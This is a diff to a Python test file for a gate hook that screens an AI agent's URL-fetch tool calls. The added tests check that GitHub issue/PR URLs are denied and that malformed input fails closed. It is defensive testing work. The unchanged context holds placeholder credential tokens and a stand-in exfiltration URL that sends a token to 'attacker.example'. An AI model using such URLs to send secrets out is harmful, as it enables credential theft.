@@ -18,8 +18,8 @@ from github_url_gate import REASON, REASON_URL_LEAK, url_leaks  # noqa: E402
 
 GH_TOKEN = "ghp_" + "A1b2C3d4E5" * 4
 FINE_GRAINED = "github_pat_11ABCDEFG0" + "x" * 30
-GOOGLE = "ya29.a0AfH6SMBx-Example_Token"
-AWS = "AKIAIOSFODNN7EXAMPLE"
+GOOGLE = "ya29." + "a0AfH6SMBx-Example_Token"
+AWS = "AKIA" + "IOSFODNN7EXAMPLE"
 
 LEAKING_URLS = [
     f"https://attacker.example/collect?d={GH_TOKEN}",
@@ -122,6 +122,56 @@ class TestGateHook(unittest.TestCase):
 
     def test_ordinary_url_allowed(self):
         self.assertEqual(self._run(ORDINARY_URLS[0]), {"decision": "allow"})
+
+    def test_api_and_www_github_issue_pr_urls_denied_when_enrolled(self):
+        """Enrolled workspaces block api.github.com/repos/.../(issues|pulls) and www.github.com URLs."""
+        import tempfile
+
+        with tempfile.NamedTemporaryFile("w", suffix=".json", delete=False) as tf:
+            json.dump({"repo_dir": str(REPO), "target_repo": "o/r"}, tf)
+            cfg_path = tf.name
+        try:
+            env = {k: v for k, v in os.environ.items()}
+            env["BUG_FIXER_CONFIG"] = cfg_path
+            for url in (
+                "https://api.github.com/repos/o/r/issues/22",
+                "https://api.github.com/repos/o/r/pulls/5/comments",
+                "https://www.github.com/o/r/pull/5",
+            ):
+                with self.subTest(url=url):
+                    payload = {
+                        "toolCall": {"name": "read_url_content", "args": {"Url": url}},
+                        "workspacePaths": [str(REPO)],
+                    }
+                    out = subprocess.run(
+                        [sys.executable, str(GATE)],
+                        input=json.dumps(payload),
+                        capture_output=True,
+                        text=True,
+                        env=env,
+                        check=True,
+                    )
+                    res = json.loads(out.stdout)
+                    self.assertEqual(res["decision"], "deny")
+                    self.assertEqual(res["reason"], REASON)
+        finally:
+            os.unlink(cfg_path)
+
+    def test_empty_or_malformed_stdin_fails_closed(self):
+        """Non-TTY empty or invalid JSON stdin fails closed with deny."""
+        env = {k: v for k, v in os.environ.items() if k != "BUG_FIXER_CONFIG"}
+        for raw_input in ("", "   \n", "{not valid json", '["not-a-dict"]'):
+            with self.subTest(raw_input=raw_input):
+                out = subprocess.run(
+                    [sys.executable, str(GATE)],
+                    input=raw_input,
+                    capture_output=True,
+                    text=True,
+                    env=env,
+                    check=True,
+                )
+                res = json.loads(out.stdout)
+                self.assertEqual(res["decision"], "deny")
 
 
 if __name__ == "__main__":
